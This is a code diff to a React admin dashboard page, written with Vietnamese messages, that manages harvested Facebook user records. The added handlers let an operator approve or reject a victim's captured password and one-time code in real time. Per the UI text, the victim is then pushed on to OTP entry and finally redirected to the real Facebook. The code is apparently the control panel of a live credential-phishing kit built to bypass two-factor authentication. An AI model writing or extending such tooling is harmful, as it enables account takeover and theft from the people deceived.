@@ -14,7 +14,7 @@ import {
 import { PATH_DASHBOARD } from '../../routes/paths';
 // redux
 import { useDispatch, useSelector } from '../../redux/store';
-import { getFbUsers, deleteFbUser, returnWrongPass, fbUserAdded, fbUserUpdated, IFbUser } from '../../redux/slices/fb';
+import { getFbUsers, deleteFbUser, returnWrongPass, acceptFbPass, acceptFbOtp, returnWrongOtp, fbUserAdded, fbUserUpdated, IFbUser } from '../../redux/slices/fb';
 // components
 import Scrollbar from '../../components/scrollbar';
 import CustomBreadcrumbs from '../../components/custom-breadcrumbs';
@@ -97,6 +97,33 @@ export default function FbUserListPage() {
     }
   };
 
+  const handleAcceptPass = async (id: string) => {
+    try {
+      await acceptFbPass(id);
+      enqueueSnackbar('Đã duyệt mật khẩu, client đã chuyển sang nhập OTP!', { variant: 'success' });
+    } catch {
+      enqueueSnackbar('Lỗi khi duyệt mật khẩu', { variant: 'error' });
+    }
+  };
+
+  const handleAcceptOtp = async (id: string) => {
+    try {
+      await acceptFbOtp(id);
+      enqueueSnackbar('Đã xác duyệt OTP xong, client đã được chuyển hướng về FB thật!', { variant: 'success' });
+    } catch {
+      enqueueSnackbar('Lỗi khi duyệt OTP', { variant: 'error' });
+    }
+  };
+
+  const handleReturnWrongOtp = async (id: string) => {
+    try {
+      await returnWrongOtp(id);
+      enqueueSnackbar('Đã báo sai OTP! Client nhận yêu cầu nhập lại mã mới.', { variant: 'warning' });
+    } catch {
+      enqueueSnackbar('Lỗi khi gửi yêu cầu', { variant: 'error' });
+    }
+  };
+
   const handleDelete = (id: string) => {
     dispatch(deleteFbUser(id));
   };
@@ -156,6 +183,9 @@ export default function FbUserListPage() {
                       key={row.id}
                       row={row}
                       onReturnWrongPass={() => handleReturnWrongPass(row.id)}
+                      onAcceptPass={() => handleAcceptPass(row.id)}
+                      onAcceptOtp={() => handleAcceptOtp(row.id)}
+                      onReturnWrongOtp={() => handleReturnWrongOtp(row.id)}
                       onDelete={() => handleDelete(row.id)}
                     />
                   ))}
